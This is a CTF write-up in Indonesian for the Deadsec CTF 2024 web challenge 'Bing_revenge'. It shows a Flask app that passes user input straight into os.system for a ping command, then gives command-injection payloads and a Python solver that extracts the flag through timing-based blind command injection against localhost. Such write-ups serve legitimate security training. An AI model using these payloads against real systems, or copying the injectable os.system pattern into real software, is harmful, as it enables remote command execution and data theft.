# Bing_revenge - Web - Deadsec CTF 2024

Pada challenge kali ini kita diberikan fitur untuk melakukan ping pada ip yang kita tentukan. namun tidak ada informasi output yang diberikan aplikasi web. Karena tidak adanya filter `command injection`, ini kita bisa manfaatkan untuk meng exploitasi `blind command injection`.

## Source Code
```python
#!/usr/bin/env python3
import os
from flask import Flask, request, render_template

app = Flask(__name__)


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/flag', methods=['GET', 'POST'])
def ping():
    if request.method == 'POST':
        host = request.form.get('host')
        cmd = f'{host}'
        if not cmd:
             return render_template('ping_result.html', data='Hello')
        try:
            output = os.system(f'ping -c 4 {cmd}')
            return render_template('ping_result.html', data="DeadSecCTF2024")
        except subprocess.CalledProcessError:
            return render_template('ping_result.html', data=f'error when executing command')
        except subprocess.TimeoutExpired:
            return render_template('ping_result.html', data='Command timed out')

    return render_template('ping.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```
pada kode diatas inputan kita akan di execute oleh `os.system(f'ping -c 4 {input}')`, yang mana kita bisa melakukan command injection seperti `os.system(f'ping -c 4 127.0.0.1; cat /flag.txt')`, namun karena tidak ada output dari program yang berjalan kita bisa memanfaatkan `blind command injection` seperti:

```bash
;["$(head -c 5 /flag.txt)" = "<our-guess>"] && ping 127.0.0.1 -c 200 || id
```

Kode diatas akan melakukan perintah `head -c 5` yang mana akan membuka flag.txt dari index 0 sampai 5. dan mencocokannya dengan `<our-guess>` yang nantinya akan kita masukan karakter dari brute-force.

jika `<our-guess>` dan flag cocok maka akan menjalankan perintah `ping 127.0.0.1 -c 200` yang akan menghasilkan `504 Gateway Timeout`. dan jika `<our-guess>` dan flag tidak cocok maka akan menghasilkan `200 OK`.

## Solver Code
```python
import requests

URL = 'http://localhost:5000/flag'
correct = 'DEAD{'
fuzzing = '0123456789-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}'
c = 6

for i in range(50):
	for fuzz in fuzzing:
		data = {'host':f';[ "$(head -c {c+i} /flag.txt)" = "{correct+fuzz}" ] && ping -c 200 127.0.0.1 || id'}
		try:
		    res = requests.post(URL, data=data, timeout=1)

		except requests.exceptions.Timeout:
		    correct += fuzz
		    print(correct)
		    
		    break
		if correct.endswith('}'):
		    	break
	if correct.endswith('}'):
		    	break
```